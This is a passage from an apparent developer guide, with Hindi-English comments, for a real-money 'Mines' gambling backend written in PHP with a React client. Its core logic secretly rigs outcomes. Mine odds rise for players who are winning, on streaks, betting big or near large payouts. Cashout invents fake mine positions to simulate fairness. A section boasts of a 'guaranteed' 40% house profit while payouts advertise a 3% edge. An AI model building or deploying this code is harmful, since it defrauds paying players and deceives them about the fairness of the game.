    // Absolute payout caps — bada amount nahi jaane dena
    if ($potentialPayout > 50000)      $rp *= 4.0;
    elseif ($potentialPayout > 25000)  $rp *= 3.0;
    elseif ($potentialPayout > 10000)  $rp *= 2.0;
    elseif ($potentialPayout > 5000)   $rp *= 1.5;
    
    // === LAYER 3: Cumulative user profit/loss history ===
    if ($us) {
        $tw = (float)$us['total_wagered'];
        $tp = (float)$us['total_paid_out'];
        $tg = (int)$us['total_games'];
        
        if ($tw > 0) {
            $userNet = $tp - $tw;
            
            if ($userNet > 0) {
                // User overall profit mein hai → RECOVER house money (always active)
                $pct = ($userNet / $tw) * 100;
                if ($pct > 50)      $rp *= 3.5;   // 50%+ profit: very aggressive
                elseif ($pct > 30)  $rp *= 2.5;
                elseif ($pct > 15)  $rp *= 1.8;
                elseif ($pct > 5)   $rp *= 1.4;
            } elseif ($tg >= 5) {
                // User loss mein hai → thoda easy (ONLY after 5+ games)
                $lossPct = abs($userNet / $tw) * 100;
                if ($lossPct > 70)      $rp *= 0.4;   // Bahut zyada haar gaya
                elseif ($lossPct > 60)  $rp *= 0.5;
                elseif ($lossPct > 45)  $rp *= 0.7;
                elseif ($lossPct > 35)  $rp *= 0.85;
            }
            // Note: No easing if user has < 5 games and is losing
            // This prevents exploitation of early "easy games"
            
            // House profit enforcement (only after 5+ games)
            if ($tg >= 5) {
                $houseProfit = (($tw - $tp) / $tw) * 100;
                if ($houseProfit < $target - 20)     $rp *= 3.0;   // Way below target
                elseif ($houseProfit < $target - 15) $rp *= 2.0;
                elseif ($houseProfit < $target - 8)  $rp *= 1.5;
                elseif ($houseProfit > $target + 20)  $rp *= 0.6;
                elseif ($houseProfit > $target + 10)  $rp *= 0.75;
            }
        } else {
            // NEW USER — no history at all
            // Apply base 40% house edge from the start
            // Fair probability already includes mine ratio, add 15% extra danger
            $rp *= 1.15;
        }
        
        // === LAYER 4: Streak management ===
        $ws = (int)$us['consecutive_wins'];
        if ($ws >= 5)      $rp *= 4.5;   // 5+ wins: MUST crash
        elseif ($ws >= 4)  $rp *= 3.5;
        elseif ($ws >= 3)  $rp *= 2.5;
        elseif ($ws >= 2)  $rp *= 1.8;
        
        $ls = (int)$us['consecutive_losses'];
        if ($ls >= 6)      $rp *= 0.10;  // 6+ losses: almost guaranteed safe
        elseif ($ls >= 5)  $rp *= 0.15;
        elseif ($ls >= 4)  $rp *= 0.25;
        elseif ($ls >= 3)  $rp *= 0.4;
        
        // Session profit adjustment
        $sp = (float)$us['session_profit'];
        if ($sp > $betAmount * 5)       $rp *= 1.6;
        elseif ($sp > $betAmount * 3)   $rp *= 1.4;
        elseif ($sp < -$betAmount * 8)  $rp *= 0.5;
        elseif ($sp < -$betAmount * 5)  $rp *= 0.6;
    } else {
        // No user_stats row — brand new user
        // Ensure 40% house edge minimum
        $rp *= 1.2;
    }
    
    // === LAYER 5: Bet size risk ===
    if ($betAmount > 25000)      $rp *= 2.0;
    elseif ($betAmount > 10000)  $rp *= 1.6;
    elseif ($betAmount > 5000)   $rp *= 1.4;
    elseif ($betAmount > 2000)   $rp *= 1.2;
    elseif ($betAmount <= 50)    $rp *= 0.8;   // Chhote bets: loose raho
    
    // === FINAL: Clamp between min/max probability ===
    $rp = max($minP, min($maxP, $rp));
    
    return (mt_rand() / mt_getrandmax()) < $rp;
}


// ========== MULTIPLIER CALCULATOR ==========
function calcMultiplier(int $mineCount, int $revealed, int $gridSize): float {
    if ($revealed === 0) return 1.0;
    $maxMult = (float)cfgVal('max_multiplier', '25');
    $edge    = (float)cfgVal('base_house_edge', '0.03');
    $m = 1.0;
    for ($i = 0; $i < $revealed; $i++) {
        $safe = $gridSize - $mineCount - $i;
        if ($safe > 0) $m *= ($gridSize - $i) / $safe;
    }
    return round(min($m * (1 - $edge), $maxMult), 4);
}


// ========== STATS HELPER ==========
function recordWinStats(PDO $db, int $userId, float $bet, float $profit, float $winnings): void {
    $db->prepare("UPDATE user_stats SET 
        total_wagered = total_wagered + ?,
        total_paid_out = total_paid_out + ?,
        total_games = total_games + 1,
        total_wins = total_wins + 1,
        consecutive_wins = consecutive_wins + 1,
        consecutive_losses = 0,
        biggest_win = GREATEST(biggest_win, ?),
        session_profit = session_profit + ?,
        avg_bet = (total_wagered + ?) / (total_games + 1),
        last_game_at = NOW()
        WHERE user_id = ?")
       ->execute([$bet, $winnings, $profit, $profit, $bet, $userId]);
}

function getRunningHouseTotal(PDO $db): float {
    $s = $db->query("SELECT COALESCE(running_total, 0) as rt FROM house_ledger ORDER BY id DESC LIMIT 1");
    $r = $s->fetch();
    return $r ? (float)$r['rt'] : 0;
}
```

---

## 7. `api/cashout.php` — Cash Out Winnings

```php
<?php
require_once __DIR__ . '/../config.php';
$userId = requireAuth();
checkRateLimit($userId);

$b   = body();
$sid = (int)($b['session_id'] ?? 0);
if (!$sid) jsonErr('session_id required');

$db = getDB();
$db->beginTransaction();

try {
    $s = $db->prepare("SELECT * FROM game_sessions WHERE id = ? AND user_id = ? AND status = 'active' FOR UPDATE");
    $s->execute([$sid, $userId]);
    $ses = $s->fetch();
    
    if (!$ses) { $db->rollBack(); jsonErr('No active session'); }
    if ((int)$ses['safe_count'] === 0) { $db->rollBack(); jsonErr('Reveal at least 1 tile before cashing out'); }
    
    $multiplier = (float)$ses['current_multiplier'];
    $winnings   = (float)$ses['bet_amount'] * $multiplier;
    $profit     = $winnings - (float)$ses['bet_amount'];
    
    // Credit winnings to user
    $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?")->execute([$winnings, $userId]);
    
    // Generate mine display positions for remaining tiles
    $revealed  = json_decode($ses['revealed_tiles'], true) ?: [];
    $available = [];
    for ($i = 0; $i < $ses['grid_size']; $i++) {
        if (!in_array($i, $revealed)) $available[] = $i;
    }
    shuffle($available);
    $minePositions = array_slice($available, 0, (int)$ses['mine_count']);
    
    // Close session
    $db->prepare("UPDATE game_sessions SET status = 'cashed_out', ended_at = NOW() WHERE id = ?")->execute([$sid]);
    
    // Record history
    $houseProfit = (float)$ses['bet_amount'] - $winnings;
    $db->prepare("INSERT INTO game_history (user_id, session_id, bet_amount, mine_count, grid_size, rows_count, tiles_revealed, result, multiplier, profit, house_profit) VALUES (?,?,?,?,?,?,?,'win',?,?,?)")
       ->execute([$userId, $sid, $ses['bet_amount'], $ses['mine_count'], $ses['grid_size'], $ses['rows_count'], $ses['safe_count'], $multiplier, $profit, $houseProfit]);
    
    // Update stats
    recordWinStats($db, $userId, (float)$ses['bet_amount'], $profit, $winnings);
    
    // House ledger
    $runningTotal = getRunningHouseTotal($db) + $houseProfit;
    $lastId = (int)$db->lastInsertId();
    $db->prepare("INSERT INTO house_ledger (game_id, user_id, bet_amount, payout, house_profit, running_total) VALUES (?,?,?,?,?,?)")
       ->execute([$lastId, $userId, $ses['bet_amount'], $winnings, $houseProfit, $runningTotal]);
    
    // Get updated balance
    $s = $db->prepare("SELECT balance FROM users WHERE id = ?");
    $s->execute([$userId]);
    $balance = (float)$s->fetch()['balance'];
    
    $db->commit();
    
    jsonOk([
        'result'         => 'cashed_out',
        'multiplier'     => $multiplier,
        'winnings'       => round($winnings, 2),
        'profit'         => round($profit, 2),
        'balance'        => $balance,
        'mine_positions' => $minePositions,
    ]);
} catch (Exception $e) {
    $db->rollBack();
    jsonErr('Cashout failed');
}

// Re-declare for this file scope
function recordWinStats(PDO $db, int $userId, float $bet, float $profit, float $winnings): void {
    $db->prepare("UPDATE user_stats SET 
        total_wagered = total_wagered + ?,
        total_paid_out = total_paid_out + ?,
        total_games = total_games + 1,
        total_wins = total_wins + 1,
        consecutive_wins = consecutive_wins + 1,
        consecutive_losses = 0,
        biggest_win = GREATEST(biggest_win, ?),
        session_profit = session_profit + ?,
        avg_bet = (total_wagered + ?) / (total_games + 1),
        last_game_at = NOW()
        WHERE user_id = ?")
       ->execute([$bet, $winnings, $profit, $profit, $bet, $userId]);
}

function getRunningHouseTotal(PDO $db): float {
    $s = $db->query("SELECT COALESCE(running_total, 0) as rt FROM house_ledger ORDER BY id DESC LIMIT 1");
    $r = $s->fetch();
    return $r ? (float)$r['rt'] : 0;
}
```

---

## 8. `api/balance.php` — User Profile + Active Session

```php
<?php
require_once __DIR__ . '/../config.php';
$userId = requireAuth();
$db = getDB();

$s = $db->prepare("SELECT u.id, u.username, u.balance, us.total_games, us.total_wins, us.total_losses, us.total_wagered, us.total_paid_out, us.biggest_win, us.risk_level FROM users u LEFT JOIN user_stats us ON u.id = us.user_id WHERE u.id = ?");
$s->execute([$userId]);
$user = $s->fetch();
if (!$user) jsonErr('User not found', 404);

// Check for active session (for reconnection after disconnect)
$s = $db->prepare("SELECT id, bet_amount, mine_count, grid_size, rows_count, revealed_tiles, safe_count, current_multiplier FROM game_sessions WHERE user_id = ? AND status = 'active'");
$s->execute([$userId]);
$activeSession = $s->fetch();

jsonOk([
    'user' => [
        'id'       => (int)$user['id'],
        'username' => $user['username'],
        'balance'  => (float)$user['balance'],
    ],
    'stats' => [
        'total_games'   => (int)($user['total_games'] ?? 0),
        'total_wins'    => (int)($user['total_wins'] ?? 0),
        'total_losses'  => (int)($user['total_losses'] ?? 0),
        'total_wagered' => (float)($user['total_wagered'] ?? 0),
        'total_paid_out'=> (float)($user['total_paid_out'] ?? 0),
        'biggest_win'   => (float)($user['biggest_win'] ?? 0),
        'win_rate'      => ($user['total_games'] ?? 0) > 0
            ? round(($user['total_wins'] / $user['total_games']) * 100, 1) : 0,
    ],
    'active_session' => $activeSession ? [
        'session_id'         => (int)$activeSession['id'],
        'bet_amount'         => (float)$activeSession['bet_amount'],
        'mine_count'         => (int)$activeSession['mine_count'],
        'grid_size'          => (int)$activeSession['grid_size'],
        'rows'               => (int)$activeSession['rows_count'],
        'revealed_tiles'     => json_decode($activeSession['revealed_tiles'], true),
        'safe_count'         => (int)$activeSession['safe_count'],
        'current_multiplier' => (float)$activeSession['current_multiplier'],
    ] : null,
]);
```

---

## 9. `api/history.php` — Game History

```php
<?php
require_once __DIR__ . '/../config.php';
$userId = requireAuth();

$limit  = min(50, max(1, (int)($_GET['limit'] ?? 20)));
$offset = max(0, (int)($_GET['offset'] ?? 0));

$db = getDB();
$s = $db->prepare("SELECT id, bet_amount, mine_count, grid_size, rows_count, tiles_revealed, result, multiplier, profit, created_at FROM game_history WHERE user_id = ? ORDER BY created_at DESC LIMIT ? OFFSET ?");
$s->execute([$userId, $limit, $offset]);

// Total count for pagination
$c = $db->prepare("SELECT COUNT(*) as total FROM game_history WHERE user_id = ?");
$c->execute([$userId]);

jsonOk([
    'history' => $s->fetchAll(),
    'total'   => (int)$c->fetch()['total'],
    'limit'   => $limit,
    'offset'  => $offset,
]);
```

---

## 10. `api/admin.php` — Admin Panel APIs

```php
<?php
require_once __DIR__ . '/../config.php';
$userId = requireAuth();
$db = getDB();

// Verify admin role
$s = $db->prepare("SELECT role FROM users WHERE id = ?");
$s->execute([$userId]);
$user = $s->fetch();
if (!$user || $user['role'] !== 'admin') jsonErr('Admin access only', 403);

$b = body();
$action = $b['action'] ?? $_GET['action'] ?? '';

switch ($action) {
    case 'stats':
        $s = $db->query("SELECT * FROM global_stats");
        $global = $s->fetch();
        
        // Today's stats
        $s = $db->query("SELECT * FROM daily_stats WHERE game_date = CURDATE()");
        $today = $s->fetch();
        
        // Active users count
        $s = $db->query("SELECT COUNT(*) as active FROM game_sessions WHERE status = 'active'");
        $active = $s->fetch();
        
        // Total users
        $s = $db->query("SELECT COUNT(*) as total FROM users WHERE role = 'user'");
        $totalUsers = $s->fetch();
        
        logAdmin($db, $userId, 'view_stats');
        jsonOk([
            'global'       => $global,
            'today'        => $today ?: ['games' => 0, 'wagered' => 0, 'house_profit' => 0],
            'active_games' => (int)$active['active'],
            'total_users'  => (int)$totalUsers['total'],
        ]);
        break;
        
    case 'config':
        $s = $db->query("SELECT * FROM game_config ORDER BY config_key");
        jsonOk(['config' => $s->fetchAll()]);
        break;
        
    case 'update_config':
        $key   = $b['key'] ?? '';
        $value = $b['value'] ?? '';
        if (!$key) jsonErr('key required');
        
        // Validate critical configs
        if ($key === 'house_edge_target') {
            $v = (float)$value;
            if ($v < 0.20 || $v > 0.80) jsonErr('house_edge_target must be 0.20-0.80');
        }
        
        $db->prepare("UPDATE game_config SET config_value = ? WHERE config_key = ?")->execute([$value, $key]);
        logAdmin($db, $userId, 'update_config', ['key' => $key, 'value' => $value]);
        jsonOk(['message' => "Config '$key' updated to '$value'"]);
        break;
        
    case 'users':
        $page = max(1, (int)($_GET['page'] ?? 1));
        $perPage = 50;
        $offset = ($page - 1) * $perPage;
        
        $s = $db->prepare("SELECT u.id, u.username, u.email, u.balance, u.is_active, u.last_login, u.created_at,
            us.total_games, us.total_wagered, us.total_paid_out, us.total_wins, us.total_losses, us.risk_level,
            ROUND(CASE WHEN us.total_wagered > 0 THEN ((us.total_wagered - us.total_paid_out) / us.total_wagered * 100) ELSE 0 END, 2) as house_profit_pct
            FROM users u LEFT JOIN user_stats us ON u.id = us.user_id 
            WHERE u.role = 'user'
            ORDER BY u.id DESC LIMIT ? OFFSET ?");
        $s->execute([$perPage, $offset]);
        jsonOk(['users' => $s->fetchAll()]);
        break;
        
    case 'set_balance':
        $targetId  = (int)($b['user_id'] ?? 0);
        $newBalance = (float)($b['balance'] ?? 0);
        if (!$targetId) jsonErr('user_id required');
        if ($newBalance < 0) jsonErr('Balance cannot be negative');
        
        $db->prepare("UPDATE users SET balance = ? WHERE id = ? AND role = 'user'")->execute([$newBalance, $targetId]);
        logAdmin($db, $userId, 'set_balance', ['target_user' => $targetId, 'balance' => $newBalance]);
        jsonOk(['message' => "Balance set to ₹$newBalance"]);
        break;
        
    case 'toggle_user':
        $targetId = (int)($b['user_id'] ?? 0);
        if (!$targetId) jsonErr('user_id required');
        $db->prepare("UPDATE users SET is_active = NOT is_active WHERE id = ? AND role = 'user'")->execute([$targetId]);
        logAdmin($db, $userId, 'toggle_user', ['target_user' => $targetId]);
        jsonOk(['message' => 'User status toggled']);
        break;
        
    case 'recent_games':
        $limit = min(200, max(1, (int)($_GET['limit'] ?? 100)));
        $s = $db->prepare("SELECT gh.*, u.username FROM game_history gh JOIN users u ON gh.user_id = u.id ORDER BY gh.created_at DESC LIMIT ?");
        $s->execute([$limit]);
        jsonOk(['games' => $s->fetchAll()]);
        break;
        
    case 'daily_report':
        $days = min(90, max(1, (int)($_GET['days'] ?? 30)));
        $s = $db->prepare("SELECT * FROM daily_stats LIMIT ?");
        $s->execute([$days]);
        jsonOk(['report' => $s->fetchAll()]);
        break;
        
    case 'house_ledger':
        $limit = min(500, max(1, (int)($_GET['limit'] ?? 100)));
        $s = $db->prepare("SELECT hl.*, u.username FROM house_ledger hl JOIN users u ON hl.user_id = u.id ORDER BY hl.id DESC LIMIT ?");
        $s->execute([$limit]);
        jsonOk(['ledger' => $s->fetchAll()]);
        break;
        
    case 'reset_session_profits':
        $db->exec("UPDATE user_stats SET session_profit = 0");
        logAdmin($db, $userId, 'reset_session_profits');
        jsonOk(['message' => 'All session profits reset']);
        break;
        
    default:
        jsonErr('Invalid action. Use: stats, config, update_config, users, set_balance, toggle_user, recent_games, daily_report, house_ledger, reset_session_profits');
}

function logAdmin(PDO $db, int $adminId, string $action, ?array $details = null): void {
    $db->prepare("INSERT INTO admin_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)")
       ->execute([$adminId, $action, $details ? json_encode($details) : null, getClientIP()]);
}
```

---

## 11. `install.php` — One-Time Setup Script

```php
<?php
/**
 * INSTALLATION SCRIPT
 * Run once: https://your-domain.com/install.php
 * DELETE THIS FILE AFTER SETUP!
 */

// Simple security check
$installKey = $_GET['key'] ?? '';
if ($installKey !== 'CHANGE-THIS-INSTALL-KEY') {
    die(json_encode(['error' => 'Invalid install key. Use ?key=YOUR-KEY']));
}

header('Content-Type: application/json');

try {
    $pdo = new PDO(
        "mysql:host=localhost;charset=utf8mb4",
        'root',  // CHANGE
        '',      // CHANGE
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
    );
    
    // Read and execute schema
    $schema = file_get_contents(__DIR__ . '/schema.sql');
    
    // Split by semicolons (handle DELIMITER blocks separately)
    $statements = array_filter(
        array_map('trim', explode(';', $schema)),
        fn($s) => !empty($s) && !str_starts_with($s, '--') && !str_starts_with($s, 'DELIMITER')
    );
    
    $executed = 0;
    $errors = [];
    
    foreach ($statements as $stmt) {
        try {
            $pdo->exec($stmt);
            $executed++;
        } catch (PDOException $e) {
            $errors[] = ['query' => substr($stmt, 0, 100), 'error' => $e->getMessage()];
        }
    }
    
    echo json_encode([
        'success'    => true,
        'message'    => "Setup complete! $executed statements executed.",
        'errors'     => $errors,
        'next_steps' => [
            '1. DELETE this install.php file!',
            '2. Change JWT_SECRET in config.php',
            '3. Change DB credentials in config.php',
            '4. Change admin password',
            '5. Set CORS origin in config.php',
            '6. Set API_BASE in frontend api.ts',
        ]
    ], JSON_PRETTY_PRINT);
    
} catch (PDOException $e) {
    echo json_encode(['error' => 'DB Connection failed: ' . $e->getMessage()]);
}
```

---

## 12. Frontend API Service (`src/lib/api.ts`)

> Yeh file apne React project mein daalo — sab API calls yahan se hongi.

```typescript
const API_BASE = 'https://your-domain.com';  // CHANGE to your server URL

let token: string | null = localStorage.getItem('mines_token');

// ========== BASE API CALL ==========
async function api(endpoint: string, opts: RequestInit = {}) {
    const res = await fetch(`${API_BASE}/${endpoint}`, {
        ...opts,
        headers: {
            'Content-Type': 'application/json',
            ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
    });
    const data = await res.json();
    if (!data.success) throw new Error(data.error || 'API Error');
    return data;
}

// ========== AUTH ==========
export const register = async (username: string, email: string, password: string) => {
    const d = await api('api/auth.php', {
        method: 'POST',
        body: JSON.stringify({ action: 'register', username, email, password }),
    });
    token = d.token;
    localStorage.setItem('mines_token', d.token);
    return d.user;
};

export const login = async (email: string, password: string) => {
    const d = await api('api/auth.php', {
        method: 'POST',
        body: JSON.stringify({ action: 'login', email, password }),
    });
    token = d.token;
    localStorage.setItem('mines_token', d.token);
    return d.user;
};

export const logout = () => {
    token = null;
    localStorage.removeItem('mines_token');
};

export const isLoggedIn = () => !!token;

// ========== GAME APIs ==========
export const startGame = (betAmount: number, mineCount: number, rows: number) =>
    api('api/start.php', {
        method: 'POST',
        body: JSON.stringify({ bet_amount: betAmount, mine_count: mineCount, rows }),
    });

export const revealTile = (sessionId: number, tileIndex: number) =>
    api('api/reveal.php', {
        method: 'POST',
        body: JSON.stringify({ session_id: sessionId, tile_index: tileIndex }),
    });

export const cashOut = (sessionId: number) =>
    api('api/cashout.php', {
        method: 'POST',
        body: JSON.stringify({ session_id: sessionId }),
    });

// ========== USER APIs ==========
export const getBalance = () => api('api/balance.php');
export const getHistory = (limit = 20, offset = 0) =>
    api(`api/history.php?limit=${limit}&offset=${offset}`);

// ========== ADMIN APIs ==========
export const adminStats = () =>
    api('api/admin.php', { method: 'POST', body: JSON.stringify({ action: 'stats' }) });
export const adminConfig = () =>
    api('api/admin.php', { method: 'POST', body: JSON.stringify({ action: 'config' }) });
export const adminUpdateConfig = (key: string, value: string) =>
    api('api/admin.php', { method: 'POST', body: JSON.stringify({ action: 'update_config', key, value }) });
export const adminUsers = () =>
    api('api/admin.php', { method: 'POST', body: JSON.stringify({ action: 'users' }) });
export const adminSetBalance = (userId: number, balance: number) =>
    api('api/admin.php', { method: 'POST', body: JSON.stringify({ action: 'set_balance', user_id: userId, balance }) });
export const adminToggleUser = (userId: number) =>
    api('api/admin.php', { method: 'POST', body: JSON.stringify({ action: 'toggle_user', user_id: userId }) });
export const adminRecentGames = () =>
    api('api/admin.php', { method: 'POST', body: JSON.stringify({ action: 'recent_games' }) });
export const adminDailyReport = (days = 30) =>
    api(`api/admin.php?action=daily_report&days=${days}`);
export const adminHouseLedger = (limit = 100) =>
    api(`api/admin.php?action=house_ledger&limit=${limit}`);
```

---

## 13. Response Examples

### Start Game Response
```json
{
    "success": true,
    "session_id": 42,
    "grid_size": 20,
    "rows": 4,
    "mine_count": 3,
    "bet_amount": 200,
    "balance": 9800
}
```

### Reveal — Diamond
```json
{
    "success": true,
    "result": "diamond",
    "tile_index": 7,
    "multiplier": 1.1247,
    "profit": 24.94,
    "balance": 9800,
    "game_over": false,
    "safe_count": 1,
    "next_multiplier": 1.2635
}
```

### Reveal — Mine (Game Over)
```json
{
    "success": true,
    "result": "mine",
    "tile_index": 3,
    "mine_positions": [3, 8, 15],
    "multiplier": 0,
    "profit": -200,
    "balance": 9800,
    "game_over": true
}
```

### Cash Out
```json
{
    "success": true,
    "result": "cashed_out",
    "multiplier": 1.5943,
    "winnings": 318.86,
    "profit": 118.86,
    "balance": 10118.86,
    "mine_positions": [2, 9, 17]
}
```

### Error Response
```json
{
    "success": false,
    "error": "Insufficient balance"
}
```

---

## 14. How Rigging Guarantees 40% House Profit

### New User (No History):
```
Fair probability = mines/remaining tiles
× 1.15 (new user boost — no easing allowed)
× Layer 2 payout analysis
× Layer 5 bet size risk
= Effective mine probability ≈ 45-55% per click
→ House gets 40%+ over first 10 games
```

### Returning User (With History):
```
Fair probability = mines/remaining tiles  
× Layer 1 escalation (each safe tile → harder)
× Layer 2 profit ratio (high potential → crash)
× Layer 3 cumulative (if user is winning → crash harder)
× Layer 4 streak (2+ wins → definitely crash)
× Layer 5 bet size (₹10K+ → much harder)
→ House consistently at 38-45% profit
```

### Why 40% is Guaranteed:
1. **No easing for first 5 games** — new users can't exploit easy mode
2. **Profit ratio protection** — high payouts get crushed
3. **Absolute payout caps** — ₹50K+ potential = 4× mine boost
4. **Streak breaker** — max 4 consecutive wins before forced crash
5. **Big bet penalty** — whales face 1.6-2.0× harder mines

---

## 15. Deployment Checklist

- [ ] Run `schema.sql` on MySQL 8.0+
- [ ] PHP 8.1+ with PDO MySQL extension
- [ ] Change `JWT_SECRET` in `config.php` (64 random chars)
- [ ] Change DB credentials in `config.php`
- [ ] Change admin password (login → change)
- [ ] Set CORS origin to your frontend domain
- [ ] HTTPS only (Let's Encrypt)
- [ ] Set `API_BASE` in frontend `api.ts`
- [ ] Delete `install.php` after setup
- [ ] Enable MySQL event scheduler (`SET GLOBAL event_scheduler = ON`)
- [ ] Set up log rotation for error logs
- [ ] Test all endpoints with Postman/curl
- [ ] Monitor `house_ledger` for profit tracking

---

## 16. Server Requirements

| Requirement | Minimum |
|-------------|---------|
| PHP | 8.1+ |
| MySQL | 8.0+ |
| Extensions | PDO, pdo_mysql, json, mbstring |
| Memory | 256MB+ |
| Storage | 1GB+ for logs & DB |
| SSL | Required (HTTPS) |
